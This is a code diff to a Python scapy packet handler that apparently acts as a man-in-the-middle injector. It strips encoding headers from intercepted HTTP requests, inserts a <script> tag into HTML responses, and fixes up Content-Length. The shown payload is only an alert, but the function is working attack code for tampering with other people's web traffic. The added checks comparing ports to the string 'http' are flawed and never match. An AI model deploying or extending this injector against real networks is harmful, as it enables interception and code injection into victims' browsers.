@@ -22,28 +22,27 @@ def process_packet(packet):
 
             modified_load = scapy_packet[scapy.Raw].load.decode()
 
-            if scapy_packet[scapy.TCP].dport == port:
+            if scapy_packet[scapy.TCP].dport == port or scapy_packet[scapy.TCP].dport == "http":
                 # Handle Requests.
             
                 # Remove accept encoding header in the load.
                 modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", modified_load)
                 modified_load = re.sub("keep-alive", "close", modified_load)
 
-            elif scapy_packet[scapy.TCP].sport == port:
+            elif scapy_packet[scapy.TCP].sport == port or scapy_packet[scapy.TCP].sport == "http":
                 # Inject JavaScript to the response.
-                inject_code = "<script>alert('test');</script>"
+                inject_code = "<script>alert('Injected code!');</script>"
 
                 modified_load = modified_load.replace("</body>", inject_code + "</body>")
                 content_length = re.search("(?:Content-Length:\s)(\d*)", modified_load)
                 if content_length and "text/html" in modified_load:
                     content_length = content_length.group(1)
                     new_content_length = len(inject_code) + int(content_length)
-                    modified_load.replace(content_length, str(new_content_length))
+                    modified_load = modified_load.replace(content_length, str(new_content_length))
 
 
             if modified_load != scapy_packet[scapy.Raw].load.decode():
                 scapy_packet[scapy.Raw].load = modified_load.encode()
-                print(scapy_packet.show())
                 del scapy_packet[scapy.IP].len
                 del scapy_packet[scapy.IP].chksum
                 del scapy_packet[scapy.TCP].chksum
@@ -54,7 +53,8 @@ def process_packet(packet):
             pass
     
     except Exception as e:
-        print(e)
+        pass
+        #print(e)
     # Forward packets to the target.
     packet.accept()
 
